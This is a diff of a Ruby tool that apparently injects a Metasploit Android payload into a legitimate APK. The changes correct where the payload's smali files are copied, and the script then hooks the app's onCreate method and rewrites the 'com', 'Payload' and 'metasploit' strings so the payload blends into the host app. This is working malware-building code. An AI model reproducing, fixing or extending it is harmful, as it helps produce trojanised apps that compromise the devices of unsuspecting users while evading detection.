@@ -400,16 +400,18 @@ end
 
 print_status("Copying payload files..")
 apk_name=apkfile.split("/")[-1].gsub(".apk", "") 
-
 payload_dir = []
+first_dir = nil
 Dir.glob(smalifile) do |path|
-  # Extraer la parte hasta "com"
   file = Dir.glob("payload/smali/com/metasploit/stage/Pay*.smali").first
-  com_dir = path[%r{^.*?/com}]
-  payload_dir = "#{com_dir}/#{apk_name}/stage/"
+  smali_root = path[%r{^.*?smali[^/]*}]
+  relative_path = path.sub(/^#{smali_root}\//, "")
+  first_dir = relative_path.split("/").first
+  payload_dir = File.join(smali_root, first_dir, apk_name, "stage")
+  puts payload_dir
   FileUtils.mkdir_p(payload_dir)
   FileUtils.mv file, File.join(payload_dir, "#{apk_name}.smali")
-end 
+end
 
 print_status("Loading #{smalifile} and injecting payload..")
 activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
@@ -423,12 +425,16 @@ final_apk+="_final"
 
 print_status("Encoding payload..")
 File.write(
-  "#{payload_dir}#{apk_name}.smali", 
-  File.read("#{payload_dir}#{apk_name}.smali").gsub("Payload", "#{apk_name}")
+  "#{payload_dir}/#{apk_name}.smali", 
+  File.read("#{payload_dir}/#{apk_name}.smali").gsub("com", "#{first_dir}")
 )
 File.write(
-  "#{payload_dir}#{apk_name}.smali",
-  File.read("#{payload_dir}#{apk_name}.smali").gsub("metasploit", "#{apk_name}")
+  "#{payload_dir}/#{apk_name}.smali", 
+  File.read("#{payload_dir}/#{apk_name}.smali").gsub("Payload", "#{apk_name}")
+)
+File.write(
+  "#{payload_dir}/#{apk_name}.smali",
+  File.read("#{payload_dir}/#{apk_name}.smali").gsub("metasploit", "#{apk_name}")
 )
 
 print "\n"
